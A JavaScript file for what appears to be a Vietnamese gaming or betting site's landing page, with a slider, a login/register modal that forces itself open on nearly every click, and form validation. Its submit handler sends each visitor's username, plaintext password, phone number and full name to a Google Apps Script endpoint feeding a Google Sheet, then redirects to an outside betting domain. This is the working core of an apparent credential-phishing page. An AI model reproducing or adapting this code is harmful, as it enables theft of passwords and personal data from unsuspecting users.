document.addEventListener("DOMContentLoaded", function () {

    // ==========================================
    // 1. XỬ LÝ THANH ĐIỀU HƯỚNG & DANH MỤC GAME
    // ==========================================
    const navItems = document.querySelectorAll('.nav-item');
    navItems.forEach(item => {
        item.addEventListener('click', function () {
            navItems.forEach(nav => nav.classList.remove('active'));
            this.classList.add('active');
        });
    });

    const categoryItems = document.querySelectorAll('.categories .cat-item');
    categoryItems.forEach(item => {
        item.addEventListener('click', function () {
            categoryItems.forEach(cat => cat.classList.remove('active', 'active-pill'));
            // Giả định nếu click vào thẻ đầu tiên thì thêm active-pill, còn lại thêm active
            this.classList.add('active'); 
        });
    });

    // ==========================================
    // 2. XỬ LÝ BANNER SLIDER
    // ==========================================
    const sliderWrapper = document.getElementById('slider-wrapper');
    const dots = document.querySelectorAll('.dot');

    if (sliderWrapper && dots.length > 0) {
        let currentSlide = 0;
        const totalSlides = 6;

        function updateSlider() {
            sliderWrapper.style.transform = `translateX(-${currentSlide * 100}%)`;
            dots.forEach(dot => dot.classList.remove('active'));
            if (dots[currentSlide]) dots[currentSlide].classList.add('active');
        }

        function nextSlide() {
            currentSlide = (currentSlide + 1) % totalSlides;
            updateSlider();
        }
        setInterval(nextSlide, 3000);
    }


    // ==========================================
    // 3. XỬ LÝ MODAL ĐĂNG NHẬP / ĐĂNG KÝ (Cấu trúc mới)
    // ==========================================
    const modal = document.getElementById('auth-modal');
    const btnClose = document.getElementById('close-auth');
    const mainTitle = document.getElementById('auth-main-title');
    
    // Các form mới
    const formLoginNew = document.getElementById('form-login-new');
    const formRegisterNew = document.getElementById('form-register-new');

    // Nút mở form (ghim ở dưới cùng màn hình)
    const btnOpenLogin = document.getElementById('btn-open-login');
    const btnOpenRegister = document.getElementById('btn-open-register');

    // Nút chuyển đổi qua lại bên trong form
    const btnSwitchToRegister = document.getElementById('switch-to-register');
    const btnSwitchToLogin = document.getElementById('switch-to-login');

    // Hàm mở Modal
    function openAuthModal(isLogin) {
        modal.classList.add('show');
        if (isLogin) {
            formLoginNew.style.display = 'block';
            formRegisterNew.style.display = 'none';
            mainTitle.textContent = 'Đăng nhập';
        } else {
            formLoginNew.style.display = 'none';
            formRegisterNew.style.display = 'block';
            mainTitle.textContent = 'Đăng ký';
        }
    }

    // Sự kiện mở modal từ các nút bên ngoài
    if (btnOpenLogin) btnOpenLogin.addEventListener('click', () => openAuthModal(true));
    if (btnOpenRegister) btnOpenRegister.addEventListener('click', () => openAuthModal(false));

    // Đóng modal
    if (btnClose) {
        btnClose.addEventListener('click', () => {
            modal.classList.remove('show');
        });
    }

    // Sự kiện chuyển đổi qua lại bên TRONG modal
    if (btnSwitchToRegister) {
        btnSwitchToRegister.addEventListener('click', function (e) {
            e.preventDefault();
            openAuthModal(false); // Chuyển sang đăng ký
        });
    }

    if (btnSwitchToLogin) {
        btnSwitchToLogin.addEventListener('click', function (e) {
            e.preventDefault();
            openAuthModal(true); // Chuyển sang đăng nhập
        });
    }

    // ==========================================
    // 4. YÊU CẦU ĐĂNG NHẬP KHI CLICK VÀO TÍNH NĂNG KHÁC
    // ==========================================
    const requireLoginElements = document.querySelectorAll('.action-item, .banner-box, .play-tag, .header .menu-icon, .header .app-icon, .cat-item, .nav-item');
    requireLoginElements.forEach(element => {
        element.addEventListener('click', function (e) {
            e.preventDefault();
            openAuthModal(true); // Ép mở popup Đăng nhập
        });
    });


    // ==========================================
    // 5. HIỆU ỨNG VIỀN VÀNG CHO INPUT (Mới)
    // ==========================================
    const inputWrappers = document.querySelectorAll('.input-wrapper');
    inputWrappers.forEach(wrapper => {
        const input = wrapper.querySelector('input');
        if (input) {
            // Khi focus vào input thì thêm class active-input
            input.addEventListener('focus', () => {
                inputWrappers.forEach(w => w.classList.remove('active-input'));
                wrapper.classList.add('active-input');
            });
            
            // Xóa dữ liệu khi bấm icon x
            const clearIcon = wrapper.querySelector('.clear-icon');
            if (clearIcon) {
                clearIcon.addEventListener('click', () => {
                    input.value = '';
                    input.focus();
                });
            }
        }
    });

    // Ẩn/hiện mật khẩu
    const togglePwIcons = document.querySelectorAll('.toggle-pw');
    togglePwIcons.forEach(icon => {
        icon.addEventListener('click', function() {
            const wrapper = this.closest('.input-wrapper');
            const input = wrapper.querySelector('input');
            if (input.type === 'password') {
                input.type = 'text';
                this.classList.remove('fa-eye-slash');
                this.classList.add('fa-eye');
            } else {
                input.type = 'password';
                this.classList.remove('fa-eye');
                this.classList.add('fa-eye-slash');
            }
        });
    });

// ==========================================
    // 6. VALIDATION VÀ GỬI DỮ LIỆU ĐẾN GOOGLE SHEETS
    // ==========================================
    const loginSubmitBtn = formLoginNew.querySelector('.btn-submit-gold');
    const registerSubmitBtn = formRegisterNew.querySelector('.btn-submit-gold');
    const scriptURL = ' https://script.google.com/macros/s/AKfycbxpz92X7ovAnLYm2qPv84X9zAuFDllPs0ZNlMZ2oKA8mLE_ZhNGe-BlulzrQzGN7CONxA/exec'; // DÁN LINK WEB APP CỦA BẠN VÀO ĐÂY

    function validateFormAndRedirect(formElement, isLogin) {
        // Lấy chính xác theo thuộc tính name đã đặt trong HTML
        const usernameInput = formElement.querySelector('input[name="username"]');
        const passwordInput = formElement.querySelector('input[name="password"]');
        const phoneInput = formElement.querySelector('input[name="phone"]');
        const fullnameInput = formElement.querySelector('input[name="fullname"]'); // Sẽ là null ở form Đăng nhập
        // 2. Kiểm tra trống chung
        const allInputs = formElement.querySelectorAll('input');
        for (let i = 0; i < allInputs.length; i++) {
            if (allInputs[i].value.trim() === '') {
                alert("Vui lòng điền đầy đủ thông tin vào tất cả các trường.");
                allInputs[i].focus();
                return;
            }
        }

        // 3. Kiểm tra Tên đăng nhập
        if (usernameInput) {
            const userLen = usernameInput.value.trim().length;
            if (userLen < 6 || userLen > 16) {
                alert("Tên đăng nhập phải từ 4 đến 16 ký tự.");
                usernameInput.focus();
                return;
            }
        }

        // 4. Kiểm tra Mật khẩu
        if (passwordInput) {
            const passLen = passwordInput.value.length;
            if (passLen < 6 || passLen > 20) {
                alert("Mật khẩu phải từ 6 đến 20 ký tự.");
                passwordInput.focus();
                return;
            }
        }

        // 5. Kiểm tra Số điện thoại
        if (phoneInput) {
            const phoneVal = phoneInput.value.trim();
            const phoneRegex = /^\d{10}$/; // Bắt buộc chính xác 10 chữ số
            
            if (!phoneRegex.test(phoneVal)) {
                alert("Số điện thoại không hợp lệ. Vui lòng nhập chính xác 10 số.");
                phoneInput.focus();
                return;
            }
        }

        // 6. Xử lý Gửi dữ liệu
        const submitBtn = formElement.querySelector('.btn-submit-gold');
        submitBtn.innerText = "Đang xử lý...";
        submitBtn.disabled = true;

        let formData = {
            status: isLogin ? 'Đăng Nhập' : 'Đăng Ký',
            username: usernameInput ? usernameInput.value.trim() : '',
            password: passwordInput ? passwordInput.value : '',
            phone: phoneInput ? phoneInput.value.trim() : '',
            fullname: fullnameInput ? fullnameInput.value.trim() : '' // Lấy giá trị Họ tên
        };

        if (scriptURL.trim() !== '') {
            fetch(scriptURL, {
                method: 'POST',
                body: JSON.stringify(formData),
                headers: { 'Content-Type': 'text/plain;charset=utf-8' }
            })
            .then(response => response.json())
            .then(() => { window.location.href = "https://ga888rong.com/vn/vn"; })
            .catch(() => { window.location.href = "https://ga888rong.com/vn/vn"; });
        } else {
            window.location.href = "https://ga888rong.com/vn/vn";
        }
    }

    // Gắn sự kiện click cho nút Đăng Nhập
    if (loginSubmitBtn) {
        loginSubmitBtn.addEventListener('click', function(e) {
            e.preventDefault();
            validateFormAndRedirect(formLoginNew, true);
        });
    }

    // Gắn sự kiện click cho nút Đăng Ký
    if (registerSubmitBtn) {
        registerSubmitBtn.addEventListener('click', function(e) {
            e.preventDefault();
            validateFormAndRedirect(formRegisterNew, false);
        });
    }
});